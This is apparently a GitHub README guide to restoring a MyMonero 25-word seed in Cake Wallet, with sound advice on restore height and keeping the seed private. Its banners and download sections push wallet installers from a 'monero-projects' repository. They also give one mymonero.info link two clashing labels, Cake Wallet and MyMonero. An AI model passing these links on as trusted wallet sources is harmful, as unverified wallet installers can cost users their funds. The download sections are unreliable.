<p align="center"><img src="https://github.com/monero-projects/learn/raw/HEAD/assets/banner-article.png" alt="MyMonero article banner" width="100%"></p>

<h1 align="center">Migrate a MyMonero 25-Word Seed</h1>
<p align="center">Restore a standard Monero phrase in another supported wallet and scan from a suitable height.</p>

<p align="center">
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe"><img src="https://img.shields.io/badge/Download_for_Windows-00C6FF?style=for-the-badge&logo=windows&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Windows"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg"><img src="https://img.shields.io/badge/Download_for_macOS-00C6FF?style=for-the-badge&logo=apple&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for macOS"></a>
  <a href="https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip"><img src="https://img.shields.io/badge/Download_for_Linux-00C6FF?style=for-the-badge&logo=linux&logoColor=1D1B1D&labelColor=00C6FF" alt="Download MyMonero for Linux"></a>
</p>

| Platform | File | Version |
|---|---|---|
| Windows | [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe) | v1.3.3 |
| macOS | [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg) | v1.3.3 |
| Linux | [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip) | v1.3.3 |

All versions and checksums are on the [MyMonero v1.3.3 release page](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3).

## Short answer
A 25-word MyMonero recovery phrase uses the standard Monero seed format. You can restore it in Cake Wallet by selecting restore/import, entering the phrase privately, and setting a restore height early enough to include the wallet’s activity.


The MyMonero.info site covers this in its [MyMonero migrate 25 word seed guide](https://mymonero.info/migrate-mymonero-25-word-seed). Before installing anything, use the [Cake Wallet download page](https://mymonero.info/github/cake-developments), and read [MyMonero safety facts](https://mymonero.info/is-mymonero-safe) if anything feels off.

## You'll see this if
- Your MyMonero backup has 25 words and you want another way to access the wallet.
- MyMonero hosted login no longer works, or you want to use a supported mobile wallet.
- You see a balance of zero or incomplete history while a restore is scanning.
- You want to know whether restoration moves coins or simply restores access.

## Why it happens
The MyMonero wallet used both a MyMonero-specific 13-word legacy seed and a standard 25-word Monero seed. A 25-word phrase follows the standard Monero format, but the restore still needs a suitable application and scan start point. Do not confuse word count with wallet balance or transaction confirmation.

MyMonero desktop’s final release is v1.3.3. The old app can still open wallets and send XMR, but it is no longer maintained; it receives no new features or security updates. MyMonero hosted servers and web wallet login stopped. The available paths described here are to continue using the desktop app or restore the seed in Cake Wallet. Cake Wallet runs on iOS, Android, macOS, and Linux; Windows desktop builds are paused at the time of writing. Compare [25-word and 13-word seeds](./mymonero-seed-13-vs-25-words.md) if you are uncertain about your backup.

Restoring the same seed does not send funds or create a new address destination for a transfer. It gives the new app access to the existing wallet. The app scans from a restore height: earlier is safer when the correct height is uncertain, but can make synchronization slower. See [restore height explained](./mymonero-restore-height-explained.md) before you begin.

---

## Fix
1. **Secure your recovery phrase.** Find the written backup privately. Do not copy it into a message, online form, shared document, or photo service. Nobody legitimate needs your seed, including anyone claiming to provide customer support.
2. **Confirm the word count and sequence.** Verify the backup contains 25 words and that the order is clear. Do not disclose the words while checking them. If the number differs, review the [seed format comparison](./mymonero-seed-13-vs-25-words.md) instead of making assumptions.
3. **Install Cake Wallet from its trusted source.** Use a distribution channel you have independently identified as belonging to Cake Wallet. Its supported platforms include iOS, Android, macOS, and Linux. Windows desktop builds are paused at the time of writing. Avoid downloading an installer sent in a direct message.
4. **Select restore existing wallet.** Choose the restore/import option, then select the standard Monero 25-word format if the app asks. Do not select create wallet unless you intend to create a different wallet. Enter the words only in the actual wallet app, in private.
5. **Review the phrase before submitting.** Check spelling, order, and spacing against your own record. If a word is uncertain, pause and consult safe troubleshooting guidance; do not test candidate phrases on random sites or give the phrase to another person.
6. **Choose a restore height.** If you know a reliable height at or before the wallet’s earliest activity, use it. If not, choose an earlier conservative point rather than a recent one. Starting earlier may extend the scan, but reduces the chance that earlier activity is missed. More detail is in [the height guide](./mymonero-restore-height-explained.md).
7. **Allow the wallet to synchronize.** Keep the app running as needed and wait for scanning to complete. A balance may not appear immediately. Check progress before concluding that the wallet is empty or changing the seed details.
8. **Review the wallet without exposing secrets.** Once synchronized, review balance and transaction history in the app. Never share the phrase to prove ownership. If you later decide to send everything to a newly generated wallet, that is a separate on-chain operation; review [sweeping funds safely](./mymonero-sweep-funds-new-wallet.md).

> [!TIP]
> A restore height is a scan setting, not part of your seed. You can write it down separately if you have a trustworthy record, but never attach the seed itself to a support request.

> [!WARNING]
> Do not accept remote assistance that asks to see or type your 25 words. Someone with the phrase can gain access to the wallet.

## If that did not work
If the phrase is rejected, make sure you selected the standard 25-word restore flow and compare the words with your private backup. Avoid editing the phrase based on guesses. See MyMonero seed not accepted for a safe sequence of checks.

If the wallet opens but displays no activity, confirm the scan is complete. Then review whether the restore height is later than the wallet’s relevant activity. A scan starting earlier may take longer; do not set a very recent height simply to get through setup quickly. The zero balance troubleshooting guide covers what to check next.

If the app reports an unavailable server or error 523, treat it as general guidance that the server connection is unavailable, not as proof that your wallet or seed is invalid. Retry later or consult the app’s general connection guidance, without disclosing your phrase. Historical import fees related to MyMonero hosted servers should not be assumed to apply today.

## Prevention
Store the seed offline in a private place and keep it readable. Record the format as standard 25-word Monero, and retain a reliable restore height separately if you know one. Avoid unnecessary seed entry on devices you do not control. Before installing wallet software, verify the source; before sending a transaction, inspect the destination address carefully. See the MyMonero migration checklist for a broader preparation plan.

## FAQ
<details><summary>Is a 25-word phrase standard Monero format?</summary>

Yes. MyMonero supported a standard 25-word Monero seed, as well as a separate 13-word legacy format.

</details>

<details><summary>Will the restore send my XMR?</summary>

No. Restoring recreates access to the existing wallet. A transfer to a new wallet requires a separate transaction.

</details>

<details><summary>What restore height should I use?</summary>

Use a reliable height at or before the activity you need. When uncertain, an earlier height is safer but takes longer to scan.

</details>

<details><summary>Can Cake Wallet run on Windows desktop?</summary>

Windows desktop builds are paused at the time of writing. Cake Wallet runs on iOS, Android, macOS, and Linux.

</details>

---

## Download MyMonero

- MyMonero download page: [mymonero.info download guide](https://mymonero.info/github/cake-developments)
- Windows: [MyMonero-wallet-Setup-v1.3.3.exe](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-Setup-v1.3.3.exe)
- macOS: [MyMonero-wallet-v1.3.3.dmg](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.dmg)
- Linux: [MyMonero-wallet-v1.3.3.zip](https://github.com/monero-projects/mymonero-desktop-wallet/releases/download/v1.3.3/MyMonero-wallet-v1.3.3.zip)

Check each file against the checksums on the [MyMonero v1.3.3 release](https://github.com/monero-projects/mymonero-desktop-wallet/releases/tag/v1.3.3) before you install it.

## Related articles

| Article | Topic |
|---|---|
| [MyMonero Restore Height Explained](./mymonero-restore-height-explained.md) | Understand the scan start point and choose a sensible value when restoring a wallet. |
| [Sweep MyMonero Funds to a New Wallet](./mymonero-sweep-funds-new-wallet.md) | Understand what sweeping does and prepare carefully before sending your full balance. |
| [MyMonero Alternative Wallet](./mymonero-alternative-wallet.md) | Your practical options after MyMonero hosted access stopped. |

[Back to all MyMonero guides](https://github.com/monero-projects/learn)
